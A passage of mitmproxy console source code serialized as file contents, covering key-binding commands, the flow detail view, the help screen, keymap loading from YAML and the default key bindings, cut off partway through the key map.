@command.command(\"console.key.unbind\")\n    def key_unbind(self, contexts: Sequence[str], key: str) -> None:\n        \"\"\"\n        Un-bind a shortcut key.\n        \"\"\"\n        try:\n            self.master.keymap.remove(key, contexts)\n        except ValueError as v:\n            raise exceptions.CommandError(v)\n\n    def _keyfocus(self):\n        kwidget = self.master.window.current(\"keybindings\")\n        if not kwidget:\n            raise exceptions.CommandError(\"Not viewing key bindings.\")\n        f = kwidget.get_focused_binding()\n        if not f:\n            raise exceptions.CommandError(\"No key binding focused\")\n        return f\n\n    @command.command(\"console.key.unbind.focus\")\n    def key_unbind_focus(self) -> None:\n        \"\"\"\n        Un-bind the shortcut key currently focused in the key binding viewer.\n        \"\"\"\n        b = self._keyfocus()\n        try:\n            self.master.keymap.remove(b.key, b.contexts)\n        except ValueError as v:\n            raise exceptions.CommandError(v)\n\n    @command.command(\"console.key.execute.focus\")\n    def key_execute_focus(self) -> None:\n        \"\"\"\n        Execute the currently focused key binding.\n        \"\"\"\n        b = self._keyfocus()\n        self.console_command(b.command)\n\n    @command.command(\"console.key.edit.focus\")\n    def key_edit_focus(self) -> None:\n        \"\"\"\n        Execute the currently focused key binding.\n        \"\"\"\n        b = self._keyfocus()\n        self.console_command(\n            \"console.key.bind\",\n            \",\".join(b.contexts),\n            b.key,\n            b.command,\n        )\n\n    def running(self):\n        self.started = True\n\n    def update(self, flows) -> None:\n        if not flows:\n            signals.update_settings.send()\n        for f in flows:\n            signals.flow_change.send(flow=f)\n", "mitmproxy/tools/console/flowdetailview.py": "import urwid\n\nimport mitmproxy.flow\nfrom mitmproxy import http\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import searchable\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import strutils\n\n\ndef maybe_timestamp(base, attr):\n    if base is not None and getattr(base, attr):\n        return human.format_timestamp_with_milli(getattr(base, attr))\n    else:\n        # in mitmdump we serialize before a connection is closed.\n        # loading those flows at a later point shouldn't display \"active\".\n        # We also use a ndash (and not a regular dash) so that it is sorted\n        # after other timestamps. We may need to revisit that in the future if it turns out\n        # to render ugly in consoles.\n        return \"\u2013\"\n\n\ndef flowdetails(state, flow: mitmproxy.flow.Flow):\n    text = []\n\n    sc = flow.server_conn\n    cc = flow.client_conn\n    req: http.Request | None\n    resp: http.Response | None\n    if isinstance(flow, http.HTTPFlow):\n        req = flow.request\n        resp = flow.response\n    else:\n        req = None\n        resp = None\n    metadata = flow.metadata\n    comment = flow.comment\n\n    if comment:\n        text.append(urwid.Text([(\"head\", \"Comment: \"), (\"text\", comment)]))\n\n    if metadata is not None and len(metadata) > 0:\n        parts = [(str(k), repr(v)) for k, v in metadata.items()]\n        text.append(urwid.Text([(\"head\", \"Metadata:\")]))\n        text.extend(common.format_keyvals(parts, indent=4))\n\n    if sc is not None and sc.peername:\n        text.append(urwid.Text([(\"head\", \"Server Connection:\")]))\n        parts = [\n            (\"Address\", human.format_address(sc.address)),\n        ]\n        if sc.peername:\n            parts.append((\"Resolved Address\", human.format_address(sc.peername)))\n        if resp:\n            parts.append((\"HTTP Version\", resp.http_version))\n        if sc.alpn:\n            parts.append((\"ALPN\", strutils.bytes_to_escaped_str(sc.alpn)))\n\n        text.extend(common.format_keyvals(parts, indent=4))\n\n        if sc.certificate_list:\n            c = sc.certificate_list[0]\n            text.append(urwid.Text([(\"head\", \"Server Certificate:\")]))\n            parts = [\n                (\"Type\", \"%s, %s bits\" % c.keyinfo),\n                (\"SHA256 digest\", c.fingerprint().hex(\" \")),\n                (\"Valid from\", str(c.notbefore)),\n                (\"Valid to\", str(c.notafter)),\n                (\"Serial\", str(c.serial)),\n                (\n                    \"Subject\",\n                    urwid.Pile(\n                        common.format_keyvals(c.subject, key_format=\"highlight\")\n                    ),\n                ),\n                (\n                    \"Issuer\",\n                    urwid.Pile(common.format_keyvals(c.issuer, key_format=\"highlight\")),\n                ),\n            ]\n\n            if c.altnames:\n                parts.append((\"Alt names\", \", \".join(str(x.value) for x in c.altnames)))\n            text.extend(common.format_keyvals(parts, indent=4))\n\n    if cc is not None:\n        text.append(urwid.Text([(\"head\", \"Client Connection:\")]))\n\n        parts = [\n            (\"Address\", human.format_address(cc.peername)),\n        ]\n        if req:\n            parts.append((\"HTTP Version\", req.http_version))\n        if cc.tls_version:\n            parts.append((\"TLS Version\", cc.tls_version))\n        if cc.sni:\n            parts.append((\"Server Name Indication\", cc.sni))\n        if cc.cipher:\n            parts.append((\"Cipher Name\", cc.cipher))\n        if cc.alpn:\n            parts.append((\"ALPN\", strutils.bytes_to_escaped_str(cc.alpn)))\n\n        text.extend(common.format_keyvals(parts, indent=4))\n\n    parts = []\n\n    if cc is not None and cc.timestamp_start:\n        parts.append(\n            (\"Client conn. established\", maybe_timestamp(cc, \"timestamp_start\"))\n        )\n        if cc.tls_established:\n            parts.append(\n                (\n                    \"Client conn. TLS handshake\",\n                    maybe_timestamp(cc, \"timestamp_tls_setup\"),\n                )\n            )\n        parts.append((\"Client conn. closed\", maybe_timestamp(cc, \"timestamp_end\")))\n\n    if sc is not None and sc.timestamp_start:\n        parts.append((\"Server conn. initiated\", maybe_timestamp(sc, \"timestamp_start\")))\n        parts.append(\n            (\"Server conn. TCP handshake\", maybe_timestamp(sc, \"timestamp_tcp_setup\"))\n        )\n        if sc.tls_established:\n            parts.append(\n                (\n                    \"Server conn. TLS handshake\",\n                    maybe_timestamp(sc, \"timestamp_tls_setup\"),\n                )\n            )\n        parts.append((\"Server conn. closed\", maybe_timestamp(sc, \"timestamp_end\")))\n\n    if req is not None and req.timestamp_start:\n        parts.append((\"First request byte\", maybe_timestamp(req, \"timestamp_start\")))\n        parts.append((\"Request complete\", maybe_timestamp(req, \"timestamp_end\")))\n\n    if resp is not None and resp.timestamp_start:\n        parts.append((\"First response byte\", maybe_timestamp(resp, \"timestamp_start\")))\n        parts.append((\"Response complete\", maybe_timestamp(resp, \"timestamp_end\")))\n\n    if parts:\n        # sort operations by timestamp\n        parts = sorted(parts, key=lambda p: p[1])\n\n        text.append(urwid.Text([(\"head\", \"Timing:\")]))\n        text.extend(common.format_keyvals(parts, indent=4))\n\n    return searchable.Searchable(text)\n", "mitmproxy/tools/console/help.py": "import urwid\n\nfrom mitmproxy import flowfilter\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import tabs\n\n\nclass CListBox(urwid.ListBox):\n    def __init__(self, contents):\n        self.length = len(contents)\n        contents = contents[:] + [urwid.Text([\"\\n\"])] * 5\n        super().__init__(contents)\n\n    def keypress(self, size, key):\n        if key == \"m_end\":\n            self.set_focus(self.length - 1)\n        elif key == \"m_start\":\n            self.set_focus(0)\n        else:\n            return super().keypress(size, key)\n\n\nclass HelpView(tabs.Tabs, layoutwidget.LayoutWidget):\n    title = \"Help\"\n    keyctx = \"help\"\n\n    def __init__(self, master):\n        self.master = master\n        self.helpctx = \"\"\n        super().__init__(\n            [\n                [self.keybindings_title, self.keybindings],\n                [self.filtexp_title, self.filtexp],\n            ]\n        )\n\n    def keybindings_title(self):\n        return \"Key Bindings\"\n\n    def format_keys(self, binds):\n        kvs = []\n        for b in binds:\n            k = b.key\n            if b.key == \" \":\n                k = \"space\"\n            kvs.append((k, b.help or b.command))\n        return common.format_keyvals(kvs)\n\n    def keybindings(self):\n        text = [urwid.Text([(\"title\", \"Common Keybindings\")])]\n\n        text.extend(self.format_keys(self.master.keymap.list(\"commonkey\")))\n\n        text.append(urwid.Text([\"\\n\", (\"title\", \"Keybindings for this view\")]))\n        if self.helpctx:\n            text.extend(self.format_keys(self.master.keymap.list(self.helpctx)))\n\n        text.append(\n            urwid.Text(\n                [\n                    \"\\n\",\n                    (\"title\", \"Global Keybindings\"),\n                ]\n            )\n        )\n\n        text.extend(self.format_keys(self.master.keymap.list(\"global\")))\n\n        return CListBox(text)\n\n    def filtexp_title(self):\n        return \"Filter Expressions\"\n\n    def filtexp(self):\n        text = []\n        text.extend(common.format_keyvals(flowfilter.help, indent=4))\n        text.append(\n            urwid.Text(\n                [\n                    \"\\n\",\n                    (\"text\", \"    Regexes are Python-style.\\n\"),\n                    (\"text\", \"    Regexes can be specified as quoted strings.\\n\"),\n                    (\n                        \"text\",\n                        '    Header matching (~h, ~hq, ~hs) is against a string of the form \"name: value\".\\n',\n                    ),\n                    (\n                        \"text\",\n                        \"    Expressions with no operators are regex matches against URL.\\n\",\n                    ),\n                    (\"text\", \"    Default binary operator is &.\\n\"),\n                    (\"head\", \"\\n    Examples:\\n\"),\n                ]\n            )\n        )\n        examples = [\n            (r\"google\\.com\", r\"Url containing \\\"google.com\"),\n            (\"~q ~b test\", r\"Requests where body contains \\\"test\\\"\"),\n            (\n                r\"!(~q & ~t \\\"text/html\\\")\",\n                \"Anything but requests with a text/html content type.\",\n            ),\n        ]\n        text.extend(common.format_keyvals(examples, indent=4))\n        return CListBox(text)\n\n    def layout_pushed(self, prev):\n        \"\"\"\n        We are just about to push a window onto the stack.\n        \"\"\"\n        self.helpctx = prev.keyctx\n        self.show()\n", "mitmproxy/tools/console/keymap.py": "import logging\nimport os\nfrom collections import defaultdict\nfrom collections.abc import Sequence\nfrom functools import cache\n\nimport ruamel.yaml.error\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy.tools.console import commandexecutor\nfrom mitmproxy.tools.console import signals\n\n\nclass KeyBindingError(Exception):\n    pass\n\n\nContexts = {\n    \"chooser\",\n    \"commands\",\n    \"commonkey\",\n    \"dataviewer\",\n    \"eventlog\",\n    \"flowlist\",\n    \"flowview\",\n    \"global\",\n    \"grideditor\",\n    \"help\",\n    \"keybindings\",\n    \"options\",\n}\n\n\nnavkeys = [\n    \"m_start\",\n    \"m_end\",\n    \"m_next\",\n    \"m_select\",\n    \"up\",\n    \"down\",\n    \"page_up\",\n    \"page_down\",\n    \"left\",\n    \"right\",\n]\n\n\nclass Binding:\n    def __init__(self, key, command, contexts, help):\n        self.key, self.command, self.contexts = key, command, sorted(contexts)\n        self.help = help\n\n    def keyspec(self):\n        \"\"\"\n        Translate the key spec from a convenient user specification to one\n        Urwid understands.\n        \"\"\"\n        return self.key.replace(\"space\", \" \")\n\n    def key_short(self) -> str:\n        return (\n            self.key.replace(\"enter\", \"\u23ce\").replace(\"right\", \"\u2192\").replace(\"space\", \"\u2423\")\n        )\n\n    def sortkey(self):\n        return self.key + \",\".join(self.contexts)\n\n\nclass Keymap:\n    def __init__(self, master):\n        self.executor = commandexecutor.CommandExecutor(master)\n        self.keys: dict[str, dict[str, Binding]] = defaultdict(dict)\n        self.bindings = []\n\n    def _check_contexts(self, contexts):\n        if not contexts:\n            raise ValueError(\"Must specify at least one context.\")\n        for c in contexts:\n            if c not in Contexts:\n                raise ValueError(\"Unsupported context: %s\" % c)\n\n    def _on_change(self) -> None:\n        signals.keybindings_change.send()\n        self.binding_for_help.cache_clear()\n\n    def add(self, key: str, command: str, contexts: Sequence[str], help=\"\") -> None:\n        \"\"\"\n        Add a key to the key map.\n        \"\"\"\n        self._check_contexts(contexts)\n\n        for b in self.bindings:\n            if b.key == key and b.command.strip() == command.strip():\n                b.contexts = sorted(list(set(b.contexts + contexts)))\n                if help:\n                    b.help = help\n                self.bind(b)\n                break\n        else:\n            self.remove(key, contexts)\n            b = Binding(key=key, command=command, contexts=contexts, help=help)\n            self.bindings.append(b)\n            self.bind(b)\n        self._on_change()\n\n    def remove(self, key: str, contexts: Sequence[str]) -> None:\n        \"\"\"\n        Remove a key from the key map.\n        \"\"\"\n        self._check_contexts(contexts)\n        for c in contexts:\n            b = self.get(c, key)\n            if b:\n                self.unbind(b)\n                b.contexts = [x for x in b.contexts if x != c]\n                if b.contexts:\n                    self.bindings.append(b)\n                    self.bind(b)\n        self._on_change()\n\n    def bind(self, binding: Binding) -> None:\n        for c in binding.contexts:\n            self.keys[c][binding.keyspec()] = binding\n\n    def unbind(self, binding: Binding) -> None:\n        \"\"\"\n        Unbind also removes the binding from the list.\n        \"\"\"\n        for c in binding.contexts:\n            del self.keys[c][binding.keyspec()]\n            self.bindings = [b for b in self.bindings if b != binding]\n        self._on_change()\n\n    def get(self, context: str, key: str) -> Binding | None:\n        if context in self.keys:\n            return self.keys[context].get(key, None)\n        return None\n\n    @cache\n    def binding_for_help(self, help: str) -> Binding | None:\n        for b in self.bindings:\n            if b.help == help:\n                return b\n        return None\n\n    def list(self, context: str) -> Sequence[Binding]:\n        b = [x for x in self.bindings if context in x.contexts or context == \"all\"]\n        single = [x for x in b if len(x.key.split()) == 1]\n        multi = [x for x in b if len(x.key.split()) != 1]\n        single.sort(key=lambda x: x.sortkey())\n        multi.sort(key=lambda x: x.sortkey())\n        return single + multi\n\n    def handle(self, context: str, key: str) -> str | None:\n        \"\"\"\n        Returns the key if it has not been handled, or None.\n        \"\"\"\n        b = self.get(context, key) or self.get(\"global\", key)\n        if b:\n            self.executor(b.command)\n            return None\n        return key\n\n    def handle_only(self, context: str, key: str) -> str | None:\n        \"\"\"\n        Like handle, but ignores global bindings. Returns the key if it has\n        not been handled, or None.\n        \"\"\"\n        b = self.get(context, key)\n        if b:\n            self.executor(b.command)\n            return None\n        return key\n\n\nkeyAttrs = {\n    \"key\": lambda x: isinstance(x, str),\n    \"cmd\": lambda x: isinstance(x, str),\n    \"ctx\": lambda x: isinstance(x, list) and [isinstance(v, str) for v in x],\n    \"help\": lambda x: isinstance(x, str),\n}\nrequiredKeyAttrs = {\"key\", \"cmd\"}\n\n\nclass KeymapConfig:\n    defaultFile = \"keys.yaml\"\n\n    def __init__(self, master):\n        self.master = master\n\n    @command.command(\"console.keymap.load\")\n    def keymap_load_path(self, path: mitmproxy.types.Path) -> None:\n        try:\n            self.load_path(self.master.keymap, path)  # type: ignore\n        except (OSError, KeyBindingError) as e:\n            raise exceptions.CommandError(\"Could not load key bindings - %s\" % e) from e\n\n    def running(self):\n        p = os.path.join(os.path.expanduser(ctx.options.confdir), self.defaultFile)\n        if os.path.exists(p):\n            try:\n                self.load_path(self.master.keymap, p)\n            except KeyBindingError as e:\n                logging.error(e)\n\n    def load_path(self, km, p):\n        if os.path.exists(p) and os.path.isfile(p):\n            with open(p, encoding=\"utf8\") as f:\n                try:\n                    txt = f.read()\n                except UnicodeDecodeError as e:\n                    raise KeyBindingError(f\"Encoding error - expected UTF8: {p}: {e}\")\n            try:\n                vals = self.parse(txt)\n            except KeyBindingError as e:\n                raise KeyBindingError(f\"Error reading {p}: {e}\") from e\n            for v in vals:\n                user_ctxs = v.get(\"ctx\", [\"global\"])\n                try:\n                    km._check_contexts(user_ctxs)\n                    km.remove(v[\"key\"], user_ctxs)\n                    km.add(\n                        key=v[\"key\"],\n                        command=v[\"cmd\"],\n                        contexts=user_ctxs,\n                        help=v.get(\"help\", None),\n                    )\n                except ValueError as e:\n                    raise KeyBindingError(f\"Error reading {p}: {e}\") from e\n\n    def parse(self, text):\n        try:\n            data = ruamel.yaml.YAML(typ=\"safe\", pure=True).load(text)\n        except ruamel.yaml.error.MarkedYAMLError as v:\n            if hasattr(v, \"problem_mark\"):\n                snip = v.problem_mark.get_snippet()\n                raise KeyBindingError(\n                    \"Key binding config error at line %s:\\n%s\\n%s\"\n                    % (v.problem_mark.line + 1, snip, v.problem)\n                )\n            else:\n                raise KeyBindingError(\"Could not parse key bindings.\")\n        if not data:\n            return []\n        if not isinstance(data, list):\n            raise KeyBindingError(\"Invalid keybinding config - expected a list of keys\")\n\n        for k in data:\n            unknown = k.keys() - keyAttrs.keys()\n            if unknown:\n                raise KeyBindingError(\"Unknown key attributes: %s\" % unknown)\n            missing = requiredKeyAttrs - k.keys()\n            if missing:\n                raise KeyBindingError(\"Missing required key attributes: %s\" % unknown)\n            for attr in k.keys():\n                if not keyAttrs[attr](k[attr]):\n                    raise KeyBindingError(\"Invalid type for %s\" % attr)\n\n        return data\n", "mitmproxy/tools/console/commands.py": "import textwrap\n\nimport urwid\n\nfrom mitmproxy import command\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.utils import signals as utils_signals\n\nHELP_HEIGHT = 5\n\ncommand_focus_change = utils_signals.SyncSignal(lambda text: None)\n\n\nclass CommandItem(urwid.WidgetWrap):\n    def __init__(self, walker, cmd: command.Command, focused: bool):\n        self.walker, self.cmd, self.focused = walker, cmd, focused\n        super().__init__(None)\n        self._w = self.get_widget()\n\n    def get_widget(self):\n        parts = [(\"focus\", \">> \" if self.focused else \"   \"), (\"title\", self.cmd.name)]\n        if self.cmd.parameters:\n            parts += [\n                (\"text\", \" \"),\n                (\"text\", \" \".join(str(param) for param in self.cmd.parameters)),\n            ]\n        if self.cmd.return_type:\n            parts += [\n                (\"title\", \" -> \"),\n                (\"text\", command.typename(self.cmd.return_type)),\n            ]\n\n        return urwid.AttrMap(urwid.Padding(urwid.Text(parts)), \"text\")\n\n    def get_edit_text(self):\n        return self._w[1].get_edit_text()\n\n    def selectable(self):\n        return True\n\n    def keypress(self, size, key):\n        return key\n\n\nclass CommandListWalker(urwid.ListWalker):\n    def __init__(self, master):\n        self.master = master\n        self.index = 0\n        self.refresh()\n\n    def refresh(self):\n        self.cmds = list(self.master.commands.commands.values())\n        self.cmds.sort(key=lambda x: x.signature_help())\n        self.set_focus(self.index)\n\n    def get_edit_text(self):\n        return self.focus_obj.get_edit_text()\n\n    def _get(self, pos):\n        cmd = self.cmds[pos]\n        return CommandItem(self, cmd, pos == self.index)\n\n    def get_focus(self):\n        return self.focus_obj, self.index\n\n    def set_focus(self, index: int) -> None:\n        cmd = self.cmds[index]\n        self.index = index\n        self.focus_obj = self._get(self.index)\n        command_focus_change.send(cmd.help or \"\")\n\n    def get_next(self, pos):\n        if pos >= len(self.cmds) - 1:\n            return None, None\n        pos = pos + 1\n        return self._get(pos), pos\n\n    def get_prev(self, pos):\n        pos = pos - 1\n        if pos < 0:\n            return None, None\n        return self._get(pos), pos\n\n\nclass CommandsList(urwid.ListBox):\n    def __init__(self, master):\n        self.master = master\n        self.walker = CommandListWalker(master)\n        super().__init__(self.walker)\n\n    def keypress(self, size: int, key: str):\n        if key == \"m_select\":\n            foc, idx = self.get_focus()\n            signals.status_prompt_command.send(partial=foc.cmd.name + \" \")\n        elif key == \"m_start\":\n            self.set_focus(0)\n            self.walker._modified()\n        elif key == \"m_end\":\n            self.set_focus(len(self.walker.cmds) - 1)\n            self.walker._modified()\n        return super().keypress(size, key)\n\n\nclass CommandHelp(urwid.Frame):\n    def __init__(self, master):\n        self.master = master\n        super().__init__(self.widget(\"\"))\n        self.set_active(False)\n        command_focus_change.connect(self.sig_mod)\n\n    def set_active(self, val):\n        h = urwid.Text(\"Command Help\")\n        style = \"heading\" if val else \"heading_inactive\"\n        self.header = urwid.AttrWrap(h, style)\n\n    def widget(self, txt):\n        cols, _ = self.master.ui.get_cols_rows()\n        return urwid.ListBox([urwid.Text(i) for i in textwrap.wrap(txt, cols)])\n\n    def sig_mod(self, txt):\n        self.set_body(self.widget(txt))\n\n\nclass Commands(urwid.Pile, layoutwidget.LayoutWidget):\n    title = \"Command Reference\"\n    keyctx = \"commands\"\n\n    focus_position: int\n\n    def __init__(self, master):\n        oh = CommandHelp(master)\n        super().__init__(\n            [\n                CommandsList(master),\n                (HELP_HEIGHT, oh),\n            ]\n        )\n        self.master = master\n\n    def layout_pushed(self, prev):\n        self.widget_list[0].walker.refresh()\n\n    def keypress(self, size, key):\n        if key == \"m_next\":\n            self.focus_position = (self.focus_position + 1) % len(self.widget_list)\n            self.widget_list[1].set_active(self.focus_position == 1)\n            key = None\n\n        # This is essentially a copypasta from urwid.Pile's keypress handler.\n        # So much for \"closed for modification, but open for extension\".\n        item_rows = None\n        if len(size) == 2:\n            item_rows = self.get_item_rows(size, focus=True)\n        i = self.widget_list.index(self.focus_item)\n        tsize = self.get_item_size(size, i, True, item_rows)\n        return self.focus_item.keypress(tsize, key)\n", "mitmproxy/tools/console/layoutwidget.py": "from typing import ClassVar\n\n\nclass LayoutWidget:\n    \"\"\"\n    All top-level layout widgets and all widgets that may be set in an\n    overlay must comply with this API.\n    \"\"\"\n\n    # Title is only required for windows, not overlay components\n    title = \"\"\n    keyctx: ClassVar[str] = \"\"\n\n    def key_responder(self):\n        \"\"\"\n        Returns the object responding to key input. Usually self, but may be\n        a wrapped object.\n        \"\"\"\n        return self\n\n    def focus_changed(self):\n        \"\"\"\n        The view focus has changed. Layout objects should implement the API\n        rather than directly subscribing to events.\n        \"\"\"\n\n    def view_changed(self):\n        \"\"\"\n        The view list has changed.\n        \"\"\"\n\n    def layout_popping(self):\n        \"\"\"\n        We are just about to pop a window off the stack, or exit an overlay.\n        \"\"\"\n\n    def layout_pushed(self, prev):\n        \"\"\"\n        We have just pushed a window onto the stack.\n        \"\"\"\n", "mitmproxy/tools/console/keybindings.py": "import textwrap\n\nimport urwid\n\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.utils import signals as utils_signals\n\nHELP_HEIGHT = 5\n\n\nclass KeyItem(urwid.WidgetWrap):\n    def __init__(self, walker, binding, focused):\n        self.walker, self.binding, self.focused = walker, binding, focused\n        super().__init__(None)\n        self._w = self.get_widget()\n\n    def get_widget(self):\n        cmd = textwrap.dedent(self.binding.command).strip()\n        parts = [\n            (4, urwid.Text([(\"focus\", \">> \" if self.focused else \"   \")])),\n            (10, urwid.Text([(\"title\", self.binding.key)])),\n            (12, urwid.Text([(\"highlight\", \"\\n\".join(self.binding.contexts))])),\n            urwid.Text([(\"text\", cmd)]),\n        ]\n        return urwid.Columns(parts)\n\n    def get_edit_text(self):\n        return self._w[1].get_edit_text()\n\n    def selectable(self):\n        return True\n\n    def keypress(self, size, key):\n        return key\n\n\nclass KeyListWalker(urwid.ListWalker):\n    def __init__(self, master, keybinding_focus_change):\n        self.keybinding_focus_change = keybinding_focus_change\n        self.master = master\n\n        self.index = 0\n        self.focusobj = None\n        self.bindings = list(master.keymap.list(\"all\"))\n        self.set_focus(0)\n        signals.keybindings_change.connect(self.sig_modified)\n\n    def sig_modified(self):\n        self.bindings = list(self.master.keymap.list(\"all\"))\n        self.set_focus(min(self.index, len(self.bindings) - 1))\n        self._modified()\n\n    def get_edit_text(self):\n        return self.focus_obj.get_edit_text()\n\n    def _get(self, pos):\n        binding = self.bindings[pos]\n        return KeyItem(self, binding, pos == self.index)\n\n    def get_focus(self):\n        return self.focus_obj, self.index\n\n    def set_focus(self, index):\n        binding = self.bindings[index]\n        self.index = index\n        self.focus_obj = self._get(self.index)\n        self.keybinding_focus_change.send(binding.help or \"\")\n        self._modified()\n\n    def get_next(self, pos):\n        if pos >= len(self.bindings) - 1:\n            return None, None\n        pos = pos + 1\n        return self._get(pos), pos\n\n    def get_prev(self, pos):\n        pos = pos - 1\n        if pos < 0:\n            return None, None\n        return self._get(pos), pos\n\n    def positions(self, reverse=False):\n        if reverse:\n            return reversed(range(len(self.bindings)))\n        else:\n            return range(len(self.bindings))\n\n\nclass KeyList(urwid.ListBox):\n    def __init__(self, master, keybinding_focus_change):\n        self.master = master\n        self.walker = KeyListWalker(master, keybinding_focus_change)\n        super().__init__(self.walker)\n\n    def keypress(self, size, key):\n        if key == \"m_select\":\n            foc, idx = self.get_focus()\n            # Act here\n        elif key == \"m_start\":\n            self.set_focus(0)\n            self.walker._modified()\n        elif key == \"m_end\":\n            self.set_focus(len(self.walker.bindings) - 1)\n            self.walker._modified()\n        return super().keypress(size, key)\n\n\nclass KeyHelp(urwid.Frame):\n    def __init__(self, master, keybinding_focus_change):\n        self.master = master\n        super().__init__(self.widget(\"\"))\n        self.set_active(False)\n        keybinding_focus_change.connect(self.sig_mod)\n\n    def set_active(self, val):\n        h = urwid.Text(\"Key Binding Help\")\n        style = \"heading\" if val else \"heading_inactive\"\n        self.header = urwid.AttrWrap(h, style)\n\n    def widget(self, txt):\n        cols, _ = self.master.ui.get_cols_rows()\n        return urwid.ListBox([urwid.Text(i) for i in textwrap.wrap(txt, cols)])\n\n    def sig_mod(self, txt):\n        self.set_body(self.widget(txt))\n\n\nclass KeyBindings(urwid.Pile, layoutwidget.LayoutWidget):\n    title = \"Key Bindings\"\n    keyctx = \"keybindings\"\n    focus_position: int\n\n    def __init__(self, master):\n        keybinding_focus_change = utils_signals.SyncSignal(lambda text: None)\n\n        oh = KeyHelp(master, keybinding_focus_change)\n        super().__init__(\n            [\n                KeyList(master, keybinding_focus_change),\n                (HELP_HEIGHT, oh),\n            ]\n        )\n        self.master = master\n\n    def get_focused_binding(self):\n        if self.focus_position != 0:\n            return None\n        f = self.widget_list[0]\n        return f.walker.get_focus()[0].binding\n\n    def keypress(self, size, key):\n        if key == \"m_next\":\n            self.focus_position = (self.focus_position + 1) % len(self.widget_list)\n            self.widget_list[1].set_active(self.focus_position == 1)\n            key = None\n\n        # This is essentially a copypasta from urwid.Pile's keypress handler.\n        # So much for \"closed for modification, but open for extension\".\n        item_rows = None\n        if len(size) == 2:\n            item_rows = self.get_item_rows(size, focus=True)\n        i = self.widget_list.index(self.focus_item)\n        tsize = self.get_item_size(size, i, True, item_rows)\n        return self.focus_item.keypress(tsize, key)\n", "mitmproxy/tools/console/__init__.py": "from mitmproxy.tools.console import master\n\n__all__ = [\"master\"]\n", "mitmproxy/tools/console/defaultkeys.py": "from mitmproxy.tools.console.keymap import Keymap\n\n\ndef map(km: Keymap) -> None:\n    km.add(\":\", \"console.command \", [\"commonkey\", \"global\"], \"Command prompt\")\n    km.add(\n        \";\",\n        \"console.command flow.comment @focus ''\",\n        [\"flowlist\", \"flowview\"],\n        \"Add comment to flow\",\n    )\n    km.add(\"?\", \"console.view.help\", [\"global\"], \"View help\")\n    km.add(\"B\", \"browser.start\", [\"global\"], \"Start an attached browser\")\n    km.add(\"C\", \"console.view.commands\", [\"global\"], \"View commands\")\n    km.add(\"K\", \"console.view.keybindings\", [\"global\"], \"View key bindings\")\n    km.add(\"O\", \"console.view.options\", [\"commonkey\", \"global\"], \"View options\")\n    km.add(\"E\", \"console.view.eventlog\", [\"commonkey\", \"global\"], \"View event log\")\n    km.add(\"Q\", \"console.exit\", [\"global\"], \"Exit immediately\")\n    km.add(\"q\", \"console.view.pop\", [\"commonkey\", \"global\"], \"Exit the current view\")\n    km.add(\"esc\", \"console.view.pop\", [\"commonkey\", \"global\"], \"Exit the current view\")\n    km.add(\"-\", \"console.layout.cycle\", [\"global\"], \"Cycle to next layout\")\n    km.add(\"ctrl right\", \"console.panes.next\", [\"global\"], \"Focus next layout pane\")\n    km.add(\"ctrl left\", \"console.panes.prev\", [\"global\"], \"Focus previous layout pane\")\n    km.add(\"shift tab\", \"console.panes.next\", [\"global\"], \"Focus next layout pane\")\n    km.add(\"P\", \"console.view.flow @focus\", [\"global\"], \"View flow details\")\n\n    km.add(\"?\", \"console.view.pop\", [\"help\"], \"Exit help\")\n\n    km.add(\"g\", \"console.nav.start\", [\"global\"], \"Go to start\")\n    km.add(\"G\", \"console.nav.end\", [\"global\"], \"Go to end\")\n    km.add(\"k\", \"console.nav.up\", [\"global\"], \"Up\")\n    km.add(\"j\", \"console.nav.down\", [\"global\"], \"Down\")\n    km.add(\"l\", \"console.nav.right\", [\"global\"], \"Right\")\n    km.add(\"h\", \"console.nav.left\", [\"global\"], \"Left\")\n    km.add(\"tab\", \"console.nav.next\", [\"commonkey\", \"global\"], \"Next\")\n    km.add(\"enter\", \"console.nav.select\", [\"commonkey\", \"global\"], \"Select\")\n    km.add(\"space\", \"console.nav.pagedown\", [\"global\"], \"Page down\")\n    km.add(\"ctrl f\", \"console.nav.pagedown\", [\"global\"], \"Page down\")\n    km.add(\"ctrl b\", \"console.nav.pageup\", [\"global\"], \"Page up\")\n\n    km.add(\n        \"I\",\n        \"set intercept_active toggle\",\n        [\"global\"],\n        \"Toggle whether the filtering via the intercept option is enabled\",\n    )\n    km.add(\"i\", \"console.command.set intercept\", [\"global\"], \"Set intercept\")\n    km.add(\"W\", \"console.command.set save_stream_file\", [\"global\"], \"Stream to file\")\n    km.add(\n        \"A\",\n        \"flow.resume @all\",\n        [\"flowlist\", \"flowview\"],\n        \"Resume all intercepted flows\",\n    )\n    km.add(\n        \"a\",\n        \"flow.resume @focus\",\n        [\"flowlist\", \"flowview\"],\n        \"Resume this intercepted flow\",\n    )\n    km.add(\n        \"b\",\n        \"console.command cut.save @focus response.content \",\n        [\"flowlist\", \"flowview\"],\n        \"Save response body to file\",\n    )\n    km.add(\n        \"d\",\n        \"view.flows.remove @focus\",\n        [\"flowlist\", \"flowview\"],\n        \"Delete flow from view\",\n    )\n    km.add(\n        \"D\", \"view.flows.duplicate @focus\", [\"flowlist\", \"flowview\"], \"Duplicate flow\"\n    )\n    km.add(\n        \"x\",\n        \"\"\"\n        console.choose.cmd Format export.formats\n        console.command export.file {choice} @focus\n        \"\"\",\n        [\"flowlist\", \"flowview\"],\n        \"Export this flow to file\",\n    )\n    km.add(\"f\", \"console.command.set view_filter\", [\"flowlist\"], \"Set view filter\")\n    km.add(\n        \"F\",\n        \"set console_focus_follow toggle\",\n        [\"flowlist\", \"flowview\"],\n        \"Set focus follow\",\n    )\n    km.add(\n        \"ctrl l\",\n        \"console.command cut.clip \",\n        [\"flowlist\", \"flowview\"],\n        \"Send cuts to clipboard\",\n    )\n    km.add(\n        \"L\", \"console.command view.flows.load \", [\"flowlist\"], \"Load flows from file\"\n    )\n    km.add(\"m\", \"flow.mark.toggle @focus\", [\"flowlist\"], \"Toggle mark on this flow\")\n    km.add(\n        \"M\",\n        \"view.properties.marked.toggle\",\n        [\"flowlist\"],\n        \"Toggle viewing marked flows\",\n    )\n    km.add(\n        \"n\",\n        